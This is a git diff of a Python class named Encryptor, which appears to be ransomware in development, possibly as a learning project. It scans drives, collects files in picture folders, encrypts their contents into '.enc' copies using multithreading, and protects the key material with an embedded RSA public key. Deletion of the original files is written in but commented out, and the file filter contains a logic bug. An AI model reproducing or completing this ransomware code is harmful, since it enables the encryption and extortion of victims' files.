@@ -60,7 +60,7 @@ class Encryptor:
                                 not entry.name.lower().endswith(tuple(EXCLUDED_EXTENSIONS)) #check if it has an excluded extension
                             ):  
                                 
-                                if "pictures" in entry.path.lower(): #just filter on desktop and pictures
+                                if ("pictures" or "Afbeeldingen") in entry.path.lower(): #just filter on desktop and pictures
                                     filepaths.append(entry.path)  # Store normal files
             
             except (PermissionError, FileNotFoundError):
@@ -108,25 +108,33 @@ class Encryptor:
 
             counter += 1
             
-            # TODO: encryptielogica
             try:
 
                 # open file 
-
-                #encrypt data
-                encrypted_content = symenc.encrypt_string("test")
-                print(f"{encrypted_content}" )
+                with open(filepath, 'r') as file:
+                    data = file.read()
+                
+                # encrypt data
+                encrypted_content = symenc.encrypt_string(data)
+                
+                print(f"{filepath} encrypted successfuly" )
                     
-                
-                
                 #open new file with .ENC enxtension
-                    #add encrypted content
-                    #add footer
+                encrypted_filepath = filepath + '.enc'
+                
+                with open(encrypted_filepath, 'wb') as enc_file:
+                    enc_file.write(encrypted_content)  # Write encrypted content and footer
+
+                print(f"{encrypted_filepath} new file created" )
+                    
 
                 #delete original file
+                #os.remove(filepath)
+
+                print(f"{encrypted_filepath} original file deleted")
             
-            except:
-                pass
+            except Exception as e:
+                print(e)
 
         print(f"[LOG] {encrypted_count} files encrypted")
 
@@ -134,11 +142,9 @@ class Encryptor:
         """
         this function is called for everyfile and creates the footer
         """
-        
         #load in the public key
         keygen = Encryption("id:1")
         keygen.load_public_key(self.public_key)
-
 
         #encrypt iv
         encrypted_iv = keygen.encrypt(iv)
@@ -189,7 +195,7 @@ class Encryptor:
 
         result = []  # List to hold the resulting parts
         start = 0  # Start index for each split
-
+        
         for i in range(threads):
             # Calculate end index for each part
             end = start + avg_len + (1 if i < remainder else 0)
@@ -202,19 +208,11 @@ class Encryptor:
         # Maak een thread voor de split file list
         start_time = time.time()
 
+
         # Verwerk de encryptie met een thread pool
         with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
             for files in result:
                 executor.submit(self.encrypt, files)
-        
-        #for i, files in enumerate(result):
-            #thread = threading.Thread(target=self.encrypt, args=(files,)) # call the encrypt method and start a thread
-            #threads.append(thread)
-            #thread.start()
-
-        # Wacht tot alle threads klaar zijn
-        #for thread in threads:
-            #thread.join()
 
         end_time = time.time()
 
@@ -244,7 +242,6 @@ MIGJAoGBAI8yZ4Q9xdMh2whC4NxfLwUbGAO5oTR3P9151g7Vq78cAWP/o2fZmzhQ
 cLRr5QmcxQYK+oOxHPA/y4WftNyp9JibQk3v2NyFRp+CVXS6Ss9cLKFaEzHXe76Q
 airp+nJl+sZa48AN+DURb5qHGn7P5qLaK2Lhfb6qpbGTDuYo2vYZAgMBAAE=
 -----END RSA PUBLIC KEY-----
-
     """)
     encrypt.scan_drives()
     encrypt.get_files()
